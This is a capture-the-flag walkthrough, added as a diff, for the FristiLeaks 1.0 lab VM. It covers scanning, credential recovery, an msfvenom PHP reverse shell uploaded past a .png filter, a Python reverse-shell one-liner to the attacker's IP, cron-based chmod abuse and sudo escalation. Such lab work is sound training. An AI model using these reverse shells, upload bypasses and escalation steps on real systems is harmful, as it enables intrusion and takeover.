@@ -1,0 +1,159 @@
+[*]
+1. Find host: nmap -sn 172.16.16.0/24
+Nmap scan report for 172.16.16.21
+Host is up (0.00019s latency).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+Host is up.
+[*]
+2. Scan host: nmap 172.16.16.21
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+[*]
+3. enumerate Ports: nmap 172.16.16.21 -sV -A -p 80
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+[*]
+4. HTTP enumeration: nikto -h 172.16.16.21
++ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
++ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 12:45:47 2015
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 3 entries which should be manually viewed.
++ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8701 requests: 0 error(s) and 15 item(s) reported on remote host
++ End Time:           2019-12-28 03:39:38 (GMT-6) (20 seconds)
+[*]
+5. HTTP dir enumeration:
+---- Scanning URL: http://172.16.16.21/cola/ ----
++ http://172.16.16.21/cola/index.html ---- Scanning URL: http://172.16.16.21/sisi/ ----
++ http://172.16.16.21/sisi/index.html (CODE:200|SIZE:33)                                                                            
+---- Scanning URL: http://172.16.16.21/beer/ ----
++ http://172.16.16.21/beer/index.html (CODE:200|SIZE:33)                                                                            
+[*]
+6. All dir enumeration shows "this is not the URL you are looking for." All are beverage names, and the fristi twitter page shows its a beverage. success with going to /fristi
+[*]
+7. Login mage shows user eezeepz, and base64 encoding in comments.
+Decoded base64 shows file header: .PNG
+.
+...
+IHDR...m...K...
+[*]
+8. PNG file shows txt: keKkeKKeKKeKkEkkEk, which is likely a password for the user found.
+[*]
+9. Login success. with eezeepz,keKkeKKeKKeKkEkkEk. File upload found.
+[*]
+10. Generate reverse shell PHP: msfvenom -p php/reverse_php -f raw LHOST=172.16.16.4 LPORT=123 -o shell.php
+[*]
+11. Failed upload. message shows:  Sorry, is not a valid file. Only allowed are: png,jpg,gif
+Sorry, file not uploaded 
+[*]
+12. Change file extension to: .php.png: mv shell.php shell.php.png.
+[*]
+13. Re-upload file. Got message
+Uploading, please wait
+The file has been uploaded to /uploads 
+[*]
+14. Start listener, and kick off shell:
+nc -nvlp 123
+URL http://172.16.16.21/fristi/uploads/shell.php.png shows Error:
+WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) 
+[*]
+15. Maybe it's an issue with the port I used? Re-try with port 443 instead of 123.
+./msfvenom -p php/reverse_php -f raw LHOST=172.16.16.4 LPORT=443 -o shell.php.png
+nc -nvlp 443
+Success!
+[*]
+16. Kick off new shell:
+which python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.16.4",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh");'
+[*]
+17. Found artifact in home directory: note.txt
+
+Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+[*]
+18. Make admin dir readable: /usr/bin/../../bin/chmod -R 777 /home/admin
+[*]
+19. Found artifacts:
+cat cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq
+cat cryptpass.py
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+[*]
+20. Build reverse script: rev.py
+import base64,codecs
+mystring = "=RFn0AKnlMHMPIzpyuTI0ITG"
+rev = mystring[::-1]
+rot = codecs.decode(rev, 'rot13')
+print(base64.b64decode(rot))
+**result: thisisalsopw123
+[*]
+21. Upgrade shell: python -c 'import pty; pty.spawn("/bin/bash")'
+[*]
+22. login as admin: su - fristigod,thisisalsopw123
+[*]
+23. Sudo -l: sudoer found!
+User fristigod may run the following commands on this host:
+    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
+[*]
+24. sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
+[*]
+25. Get flag: cat notes.txt
+
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+[*]
+
+
